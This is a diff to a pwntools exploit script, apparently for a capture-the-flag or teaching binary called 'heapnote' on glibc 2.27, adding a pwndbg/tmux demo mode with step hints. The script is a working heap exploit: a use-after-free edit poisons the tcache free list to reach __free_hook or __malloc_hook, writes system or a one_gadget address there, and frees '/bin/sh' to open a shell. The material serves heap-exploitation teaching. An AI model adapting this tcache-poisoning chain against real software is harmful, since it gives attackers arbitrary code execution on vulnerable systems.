@@ -33,12 +33,33 @@ Run
 """
 
 from pwn import *
+import sys
+
+# --demo: attach pwndbg in a tmux split pane. `break menu` stops the proc after
+# every command with a clean pwndbg prompt (no Ctrl-C needed). At each DEMO hint
+# run the named pwndbg command in the gdb pane, then `continue` there to advance.
+# Without --demo the script runs straight to a shell (default; pipe-friendly).
+DEMO = "--demo" in sys.argv
 
 context.binary = exe = ELF("./heapnote")
 libc = ELF("./glibc-2.27/libc-2.27.so")
 context.log_level = "info"
 
 p = process("./heapnote")
+
+# ---- live demo support (gdb/pwndbg + tmux) ----------------------------------
+# Run inside tmux:  python3 c3_uaf_poison/exp.py --demo
+# pwndbg attaches in a right-hand pane with `break menu`: the proc stops after
+# every command, so you get a real pwndbg prompt to run `tcache`/`p &__free_hook`.
+# Inspect at each DEMO hint, then `continue` in the gdb pane to advance.
+def demo_hint(msg: str):
+    if DEMO:
+        log.info("DEMO | %s", msg)
+
+if DEMO:
+    context.terminal = ["tmux", "splitw", "-h", "-p", "55"]
+    gdb.attach(p, gdbscript="break menu\ncontinue\n")
+    demo_hint("gdb attached (right pane). Proc stops after each command; inspect, then `continue` to advance.")
 
 # ---- menu helpers -----------------------------------------------------------
 def add(idx: int, size: int, data: bytes):
@@ -93,20 +114,24 @@ add(2, SZ, b"a" * 8)
 add(3, SZ, b"b" * 8)
 delete(3)        # head=3, counts=1
 delete(2)        # head=2 -> 3, counts=2  (two DIFFERENT chunks: no double-free)
+demo_hint("run: tcache | 0x70 bin 2->3, counts=2 (NO self-loop -- contrast C1)")
 # UAF-Edit the HEAD (note 2): its data overlaps the freed chunk's fd.
 if USE_ONE_GADGET:
     target = free_hook if False else libc.symbols["__malloc_hook"]
     payload_val = libc.address + ONE_GADGET
     edit(2, 8, p64(payload_val))
     log.info("poisoned fd -> __malloc_hook = one_gadget %#x", payload_val)
+    demo_hint("run: tcache | head's fd -> __malloc_hook (one_gadget)")
 else:
     edit(2, 8, p64(free_hook))
     log.info("poisoned fd -> __free_hook")
+    demo_hint("run: tcache | head's fd -> __free_hook")
 
 add(4, SZ, b"PAD")                       # malloc #1: returns chunk-2
 if USE_ONE_GADGET:
     add(5, SZ, p64(libc.address + ONE_GADGET))  # malloc #2: returns __malloc_hook
     log.success("__malloc_hook = one_gadget")
+    demo_hint("run: p &__malloc_hook | value == one_gadget; continue in gdb to trigger malloc")
     # trigger via malloc: any Add calls malloc -> hook fires -> one_gadget
     p.sendlineafter(b"> ", b"1")
     p.sendlineafter(b"idx: ", b"8")
@@ -115,6 +140,7 @@ if USE_ONE_GADGET:
 else:
     add(5, SZ, p64(system))              # malloc #2: returns __free_hook
     log.success("__free_hook = system")
+    demo_hint("run: p &__free_hook | value == system")
     add(6, SZ, b"/bin/sh\x00")
     delete(6)                            # free("/bin/sh") -> system
     log.success("shell popped")
